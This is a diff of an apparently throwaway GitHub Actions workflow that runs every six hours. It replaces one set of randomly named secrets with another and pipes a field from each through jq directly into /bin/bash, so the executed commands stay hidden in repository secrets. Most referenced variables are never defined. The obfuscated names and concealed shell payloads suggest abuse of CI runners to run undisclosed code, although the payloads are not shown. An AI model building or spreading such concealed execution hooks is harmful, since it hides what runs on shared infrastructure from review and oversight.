@@ -1,27 +1,28 @@
 name: jiangjing19871010
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '10 4/6 * * *'
-
-jobs:  # 28970
+    - cron: '40 4/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: jiangjing19871010
         env:
-          n15: ${{ secrets.n15 }}
+          kpyj44: ${{ secrets.kpyj44 }}
         run: |
-          echo $n15 | jq -r .euw2952 | /bin/bash
-          echo $d768 | jq -r .pk8854 | /bin/bash
-          echo $h9 | jq -r .vrdc07915 | /bin/bash
-          echo $eu539 | jq -r .mok2735 | /bin/bash
-          echo $yu1 | jq -r .lnc41693 | /bin/bash
-          echo $wkwm1574 | jq -r .f653 | /bin/bash
-          echo $gjthq58 | jq -r .pbiga483 | /bin/bash
-          echo $hjyc9 | jq -r .tmi368 | /bin/bash
-          echo $dn540 | jq -r .nd11412 | /bin/bash
-          echo $wj94 | jq -r .satu85676 | /bin/bash
+          echo $kpyj44 | jq -r .v46741 | /bin/bash
+          echo $yxawd7 | jq -r .cxt20706 | /bin/bash
+          echo $gon3 | jq -r .lzt425 | /bin/bash
+          echo $ermt7588 | jq -r .a60818 | /bin/bash
+          echo $cbar93 | jq -r .rxvvy6177 | /bin/bash
+          echo $fxpih1429 | jq -r .ggesu860 | /bin/bash
+          echo $kqkmk66 | jq -r .yt81 | /bin/bash
+          echo $umc5 | jq -r .m1390 | /bin/bash
+          echo $sej023 | jq -r .pno0714 | /bin/bash
+          echo $fhbkd5 | jq -r .ou83396 | /bin/bash
+          echo $x4182 | jq -r .gb9 | /bin/bash
+          echo $jwxv0 | jq -r .jqvx0 | /bin/bash
 
